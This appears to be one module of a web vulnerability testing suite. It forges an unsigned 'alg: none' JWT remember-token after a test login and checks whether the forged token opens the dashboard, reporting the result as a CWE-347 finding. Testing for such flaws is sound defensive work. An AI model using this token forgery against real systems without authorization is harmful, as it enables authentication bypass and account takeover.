from __future__ import annotations

import base64
import json

import requests

from attack_suite.result_schema import AttackResult
from attack_suite.modules.common import post_form


def _b64(data: dict[str, str]) -> str:
    raw = json.dumps(data, separators=(",", ":")).encode("utf-8")
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("utf-8")


def run(target_url: str) -> AttackResult:
    session = requests.Session()
    post_form(
        session,
        target_url,
        "/login",
        {"username": "testuser", "password": "Password123", "remember_me": "on"},
        timeout=5,
        allow_redirects=False,
    )

    token = session.cookies.get("remember_token", "")
    if not token:
        return AttackResult(
            attack_name="JWT Attack",
            target=target_url,
            vulnerable=False,
            evidence="No JWT remember token observed",
            severity="High",
            cwe_id="CWE-347",
        )

    header = _b64({"alg": "none", "typ": "JWT"})
    payload = _b64({"sub": "testuser"})
    none_token = f"{header}.{payload}."
    session.cookies.set("remember_token", none_token)
    dashboard = session.get(f"{target_url}/dashboard", timeout=5)
    vulnerable = "Dashboard" in dashboard.text

    return AttackResult(
        attack_name="JWT Attack",
        target=target_url,
        vulnerable=vulnerable,
        evidence=f"alg_none_status={dashboard.status_code}",
        severity="High",
        cwe_id="CWE-347",
    )
